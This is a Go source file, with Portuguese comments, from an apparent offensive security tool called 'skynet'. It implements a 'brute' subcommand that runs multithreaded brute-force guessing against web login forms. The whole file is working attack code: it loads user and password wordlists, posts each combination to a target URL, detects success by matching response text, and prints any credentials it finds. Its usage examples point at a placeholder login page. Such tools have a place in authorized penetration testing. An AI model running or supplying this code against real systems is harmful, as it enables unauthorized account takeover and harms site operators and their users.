package cmd

import (
	"fmt"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"torneira-de-soco-ingles/internal"

	"github.com/spf13/cobra"
)

var (
	bruteTarget       string
	bruteUserlist     string
	brutePasslist     string
	bruteUsername     string
	bruteUserField    string
	brutePassField    string
	bruteSuccessMatch string
	bruteFailMatch    string
	bruteThreads      int
	bruteDelay        int
	bruteVerbose      bool
)

var bruteCmd = &cobra.Command{
	Use:   "brute",
	Short: "Executa força bruta em formulários de login",
	Long: `Módulo de força bruta para formulários de autenticação.
	
Exemplos:
  skynet brute -t http://target.com/login -U users.txt -P passwords.txt --user-field username --pass-field password --fail "Invalid"
  skynet brute -t http://target.com/login -u admin -P passwords.txt --user-field user --pass-field pass --success "Welcome"`,
	Run: func(cmd *cobra.Command, args []string) {
		runBruteForce()
	},
}

func init() {
	bruteCmd.Flags().StringVarP(&bruteTarget, "target", "t", "", "URL do formulário de login (obrigatório)")
	bruteCmd.Flags().StringVarP(&bruteUserlist, "userlist", "U", "", "Wordlist de usuários")
	bruteCmd.Flags().StringVarP(&brutePasslist, "passlist", "P", "", "Wordlist de senhas (obrigatório)")
	bruteCmd.Flags().StringVarP(&bruteUsername, "username", "u", "", "Usuário específico para testar")
	bruteCmd.Flags().StringVar(&bruteUserField, "user-field", "username", "Nome do campo de usuário no formulário")
	bruteCmd.Flags().StringVar(&brutePassField, "pass-field", "password", "Nome do campo de senha no formulário")
	bruteCmd.Flags().StringVar(&bruteSuccessMatch, "success", "", "String que indica login bem sucedido")
	bruteCmd.Flags().StringVar(&bruteFailMatch, "fail", "", "String que indica login falhou")
	bruteCmd.Flags().IntVar(&bruteThreads, "threads", 10, "Número de threads")
	bruteCmd.Flags().IntVar(&bruteDelay, "delay", 0, "Delay entre requisições (ms)")
	bruteCmd.Flags().BoolVarP(&bruteVerbose, "verbose", "v", false, "Modo verboso")

	bruteCmd.MarkFlagRequired("target")
	bruteCmd.MarkFlagRequired("passlist")

	rootCmd.AddCommand(bruteCmd)
}

type Credential struct {
	Username string
	Password string
}

func runBruteForce() {
	internal.PrintBanner()
	internal.PrintInfo("Iniciando módulo de Brute-force...")

	if bruteTarget == "" {
		internal.PrintError("Target não especificado!")
		return
	}

	if bruteSuccessMatch == "" && bruteFailMatch == "" {
		internal.PrintError("Especifique --success ou --fail para detectar resultado do login")
		return
	}

	var users []string
	if bruteUsername != "" {
		users = []string{bruteUsername}
	} else if bruteUserlist != "" {
		var err error
		users, err = internal.LoadWordlist(bruteUserlist)
		if err != nil {
			internal.PrintError("Erro ao carregar userlist: %v", err)
			return
		}
	} else {
		internal.PrintError("Especifique -u (usuário) ou -U (userlist)")
		return
	}

	passwords, err := internal.LoadWordlist(brutePasslist)
	if err != nil {
		internal.PrintError("Erro ao carregar passlist: %v", err)
		return
	}

	internal.PrintInfo("Target: %s", bruteTarget)
	internal.PrintInfo("Usuários: %d", len(users))
	internal.PrintInfo("Senhas: %d", len(passwords))
	internal.PrintInfo("Threads: %d", bruteThreads)
	internal.PrintInfo("Total de combinações: %d", len(users)*len(passwords))
	fmt.Println()

	client := internal.NewHTTPClient(10, true, "")
	client.SetHeader("Content-Type", "application/x-www-form-urlencoded")

	credentials := make(chan Credential, bruteThreads*2)
	var wg sync.WaitGroup
	var found int32
	var tested int32
	total := int32(len(users) * len(passwords))

	startTime := time.Now()

	for i := 0; i < bruteThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for cred := range credentials {
				if atomic.LoadInt32(&found) > 0 {
					continue
				}

				if bruteDelay > 0 {
					time.Sleep(time.Duration(bruteDelay) * time.Millisecond)
				}

				formData := map[string]string{
					bruteUserField: cred.Username,
					brutePassField: cred.Password,
				}
				resp, err := client.PostForm(bruteTarget, formData)

				atomic.AddInt32(&tested, 1)
				current := atomic.LoadInt32(&tested)

				if err != nil {
					if bruteVerbose {
						internal.PrintError("Erro: %s:%s - %v", cred.Username, cred.Password, err)
					}
					continue
				}

				success := false
				if bruteSuccessMatch != "" && strings.Contains(resp.Body, bruteSuccessMatch) {
					success = true
				} else if bruteFailMatch != "" && !strings.Contains(resp.Body, bruteFailMatch) {
					success = true
				}

				if success {
					atomic.StoreInt32(&found, 1)
					fmt.Println()
					internal.PrintSuccess("═══════════════════════════════════════════════")
					internal.PrintSuccess("  CREDENCIAL ENCONTRADA!")
					internal.PrintSuccess("  Usuário: %s", cred.Username)
					internal.PrintSuccess("  Senha: %s", cred.Password)
					internal.PrintSuccess("═══════════════════════════════════════════════")
				} else if bruteVerbose {
					fmt.Printf("\r[*] Testando: %s:%s [%d/%d]", cred.Username, cred.Password, current, total)
				} else {
					fmt.Printf("\r[*] Progresso: %d/%d (%.1f%%)", current, total, float64(current)/float64(total)*100)
				}
			}
		}()
	}

	for _, user := range users {
		for _, pass := range passwords {
			if atomic.LoadInt32(&found) > 0 {
				break
			}
			credentials <- Credential{Username: user, Password: pass}
		}
		if atomic.LoadInt32(&found) > 0 {
			break
		}
	}
	close(credentials)

	wg.Wait()

	elapsed := time.Since(startTime)
	fmt.Println()
	internal.PrintInfo("Tempo total: %v", elapsed)
	internal.PrintInfo("Combinações testadas: %d", atomic.LoadInt32(&tested))

	if atomic.LoadInt32(&found) == 0 {
		internal.PrintWarning("Nenhuma credencial válida encontrada")
	}
}
